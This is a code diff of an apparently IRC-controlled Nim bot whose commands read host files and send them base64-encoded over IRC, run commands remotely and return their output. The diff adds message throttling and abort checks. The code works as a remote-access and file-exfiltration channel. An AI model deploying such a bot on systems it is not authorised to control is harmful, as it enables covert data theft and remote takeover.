@@ -1,9 +1,9 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, times
 
 let
     g_dbg* = true
     g_msg_length = 400
-    g_msg_send_time = 2 #seconds
+    g_msg_send_time = 1 #seconds
     g_msg_max_transfer_time = 20
 var
     g_abort = false
@@ -133,6 +133,9 @@ proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bo
 
 
 
+
+
+
 ## Downloads the specified file, compresses it as .gz and sends it encoded as base64
 ## A very slow file transfer, maybe implement DCC somehow??
 proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
@@ -157,6 +160,8 @@ proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.
             else:
                 discard client.privmsg(event.origin, b64_cfile[i..high(b64_cfile)])
                 break
+            if g_abort: break
+            await sleepAsync(g_msg_send_time*1000)
             i+=g_msg_length+1
         close(file)
 
@@ -164,6 +169,9 @@ proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.
     else:
         if g_dbg: echo "File missing"
         client.privmsg(event.origin, "that did not work out")
+
+
+
 
 
 
@@ -186,6 +194,8 @@ proc cmd_print(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) 
                     discard client.privmsg(event.origin, morsel)
             else:
                 discard client.privmsg(event.origin, line)
+            if g_abort: break
+            await sleepAsync(g_msg_send_time*1000)
 
         close(file)
 
@@ -193,6 +203,9 @@ proc cmd_print(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) 
     else:
         if g_dbg: echo "File missing"
         client.privmsg(event.origin, "that did not work out")
+
+
+
 
 
 
@@ -213,6 +226,10 @@ proc cmd_dxdiag(event:IrcEvent, client:AsyncIrc) {.async.} =
     if g_dbg: echo "Dxdiag command done"
 
 
+
+
+
+
 proc cmd_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event:IrcEvent) {.async.} =
     while not response.finished() and not response.failed():
         await sleepAsync(1000)
@@ -221,12 +238,16 @@ proc cmd_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event:Ir
         if response.read().exitCode == 0:
             var value:string = response.read().output
             for line in value.splitLines():
+                if line.strip() == "": continue
                 if g_abort: break
                 discard client.privmsg(event.origin, line)
+                await sleepAsync(g_msg_send_time*1000)
         else:
             discard client.privmsg(event.origin, "Error [ "  & $response.read().exitCode & " ]")
     else:
         discard client.privmsg(event.origin, "cmd: future failed")
+
+
 
 
 
@@ -277,10 +298,18 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
     #         client.privmsg(event.origin, line)
 
 
+
+
+
+
 proc cmd_abort():void {.thread.} = 
     g_abort = true
     sleep(2500)
     g_abort = false
+
+
+
+
 
 
 ## Checks if a private message was a command and calls appropriate functions
